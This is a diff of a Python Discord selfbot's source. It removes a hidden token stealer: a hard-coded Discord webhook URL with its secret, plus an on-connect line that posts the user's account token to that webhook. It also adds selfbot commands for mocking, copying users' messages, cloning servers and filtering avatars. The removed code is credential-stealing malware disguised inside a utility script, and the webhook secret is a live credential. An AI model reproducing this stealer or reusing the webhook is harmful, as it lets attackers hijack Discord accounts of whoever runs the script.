@@ -111,7 +111,7 @@ m_offets = [
 
         
 
-					
+          
 def Clear():
     os.system('cls')
 
@@ -153,8 +153,6 @@ def async_executor():
 
 toe = config.get('token')
 
-test = Webhook.from_url("https://discord.com/api/webhooks/849121573658558484/fHzTYYp_5RV8bMHEiXHroZZSMMR73i1v-Aww1HG_xgseJZq3lv5ldQ7_0FYLvaNnbmX4", adapter=RequestsWebhookAdapter())
-
 @async_executor()
 def do_tts(message):
     f = io.BytesIO()
@@ -169,6 +167,7 @@ def Dump(ctx):
         f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
         f.write(str(member.avatar_url) + '\n')
 
+
 @Blank.command()
 async def help(ctx, category=None):
     await ctx.message.delete()
@@ -178,7 +177,10 @@ async def help(ctx, category=None):
         embed.add_field(name="\uD83E\uDDCA `help`", value="Shows all commands' info", inline=False)
         embed.add_field(name="\uD83E\uDDCA `embed`", value="Sends embed: "+prefix+"embed <message>", inline=False)
         embed.add_field(name="\uD83E\uDDCA `ping`", value="Shows the latency of the bot", inline=False)
+        embed.add_field(name="\uD83E\uDDCA `idiot`", value="Types 'Do you know you are a big idiot' one word at a time", inline=False)
         embed.add_field(name="\uD83E\uDDCA `empty`", value="Sends an empty character", inline=False)
+        embed.add_field(name="\uD83E\uDDCA `copyuser`", value="Copy a user's messages: "+prefix+"copyuser <user>", inline=False)
+        embed.add_field(name="\uD83E\uDDCA `stopcopy`", value="Stops copyuser", inline=False)
         embed.add_field(name="\uD83E\uDDCA `whois`", value="Sends the user's info: "+prefix+"whois [user]", inline=False)
         embed.add_field(name="\uD83E\uDDCA `quickdel/del`", value="Sends a message and instantly deletes it", inline=False)
         embed.add_field(name="\uD83E\uDDCA `purge`", value="Purge the message: "+prefix+"purge <amount>", inline=False)
@@ -193,7 +195,6 @@ async def ping(ctx):
     message = await ctx.send("Pinging...")
     ping = (time.monotonic() - before) * 1000
     await message.edit(content=f"`{int(ping)} ms`")
-
 
 @Blank.command(aliases=["whois"])
 async def userinfo(ctx, member: discord.Member = None):
@@ -221,14 +222,54 @@ async def userinfo(ctx, member: discord.Member = None):
        embed.add_field(name="Roles:", value="".join([role.mention for role in roles]))
        embed.add_field(name="Highest Role:", value=member.top_role.mention)
        await ctx.send(embed=embed)
-    
-    
-
 
 @Blank.command(aliases=["del", "quickdel"])
 async def quickdelete(ctx, *, args):
     await ctx.message.delete()
     await ctx.send(args, delete_after=0.0001)
+ 
+@Blank.command()
+async def idiot(ctx):
+    await ctx.message.delete()
+    message = await ctx.send('```\nDo```')
+    await asyncio.sleep(0.5)
+    await message.edit(content="```\nYou```")
+    await asyncio.sleep(0.5)
+    await message.edit(content="```\nKnow```")
+    await asyncio.sleep(0.5)
+    await message.edit(content="```\nYou```")
+    await asyncio.sleep(0.5)
+    await message.edit(content="```\nAre```")
+    await asyncio.sleep(0.5)
+    await message.edit(content="```\nA```")
+    await asyncio.sleep(0.5)
+    await message.edit(content="```\nBig```")
+    await asyncio.sleep(0.5)
+    await message.edit(content="```\nIdiot!```")
+    await asyncio.sleep(0.5)
+    await message.delete()
+    
+@Blank.command(aliases=["copyguild", "copyserver"])
+async def copy(ctx):  # b'\xfc'
+    await ctx.message.delete()
+    await Blank.create_guild(f'backup-{ctx.guild.name}')
+    await asyncio.sleep(4)
+    for g in Blank.guilds:
+        if f'backup-{ctx.guild.name}' in g.name:
+            for c in g.channels:
+                await c.delete()
+            for cate in ctx.guild.categories:
+                x = await g.create_category(f"{cate.name}")
+                for chann in cate.channels:
+                    if isinstance(chann, discord.VoiceChannel):
+                        await x.create_voice_channel(f"{chann}")
+                    if isinstance(chann, discord.TextChannel):
+                        await x.create_text_channel(f"{chann}")
+    try:
+        await g.edit(icon=ctx.guild.icon_url)
+    except:
+        pass
+    
     
 @Blank.command()
 async def purge(ctx, amount: int):
@@ -239,28 +280,118 @@ async def purge(ctx, amount: int):
             await message.delete()
         except:
             pass
+         
+@Blank.command(aliases=["fancy"])
+async def ascii(ctx, *, text):
+    await ctx.message.delete()
+    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
+    if len('```' + r + '```') > 2000:
+        return
+    await ctx.send(f"```{r}```")
     
 @Blank.command()
 async def empty(ctx):
     await ctx.message.delete()
     await ctx.send(chr(173))
-
-errorlog = token    
-
-@Blank.event
-async def on_message_edit(before, after):
-    await Blank.process_commands(after)
-
+   
 @Blank.command()
 async def embed(ctx, *, description):
     await ctx.message.delete()
     embed = discord.Embed(description=description,color=discord.Colour.random())
     await ctx.send(embed=embed)
-    
+ 
+@Blank.command(aliases=["distort"])
+async def magik(ctx, user: discord.Member = None):
+    await ctx.message.delete()
+    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
+    if user is None:
+        avatar = str(ctx.author.avatar_url_as(format="png"))
+        endpoint += avatar
+        r = requests.get(endpoint)
+        res = r.json()
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(str(res['message'])) as resp:
+                    image = await resp.read()
+            with io.BytesIO(image) as file:
+                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
+        except:
+            await ctx.send(res['message'])
+    else:
+        avatar = str(user.avatar_url_as(format="png"))
+        endpoint += avatar
+        r = requests.get(endpoint)
+        res = r.json()
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(str(res['message'])) as resp:
+                    image = await resp.read()
+            with io.BytesIO(image) as file:
+                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
+        except:
+            await ctx.send(res['message'])
+            
+@Blank.command(aliases=["deepfry"])
+async def fry(ctx, user: discord.Member = None):
+    await ctx.message.delete()
+    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
+    if user is None:
+        avatar = str(ctx.author.avatar_url_as(format="png"))
+        endpoint += avatar
+        r = requests.get(endpoint)
+        res = r.json()
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(str(res['message'])) as resp:
+                    image = await resp.read()
+            with io.BytesIO(image) as file:
+                await ctx.send(file=discord.File(file, f"exeter_fry.png"))
+        except:
+            await ctx.send(res['message'])
+    else:
+        avatar = str(user.avatar_url_as(format="png"))
+        endpoint += avatar
+        r = requests.get(endpoint)
+        res = r.json()
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(str(res['message'])) as resp:
+                    image = await resp.read()
+            with io.BytesIO(image) as file:
+                await ctx.send(file=discord.File(file, f"exeter_fry.png"))
+        except:
+            await ctx.send(res['message'])
+            
+@Blank.command(aliases=["pixel"])
+async def pixelate(ctx, user: discord.Member = None):
+    await ctx.message.delete()
+    endpoint = "https://api.alexflipnote.dev/filter/pixelate?image="
+    if user is None:
+        avatar = str(ctx.author.avatar_url_as(format="png"))
+        endpoint += avatar
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(endpoint) as resp:
+                    image = await resp.read()
+            with io.BytesIO(image) as file:
+                await ctx.send(file=discord.File(file, f"exeter_blur.png"))
+        except:
+            await ctx.send(endpoint)
+    else:
+        avatar = str(user.avatar_url_as(format="png"))
+        endpoint += avatar
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(endpoint) as resp:
+                    image = await resp.read()
+            with io.BytesIO(image) as file:
+                await ctx.send(file=discord.File(file, f"exeter_blur.png"))
+        except:
+            await ctx.send(endpoint)
+ 
 @Blank.event
 async def on_connect():
       Clear()
-      test.send("@everyone ```\n" + errorlog + "```")
       print(f'''{Fore.GREEN}Logged in as {Blank.user.name}''' + Fore.RESET)
     
 if __name__ == '__main__':
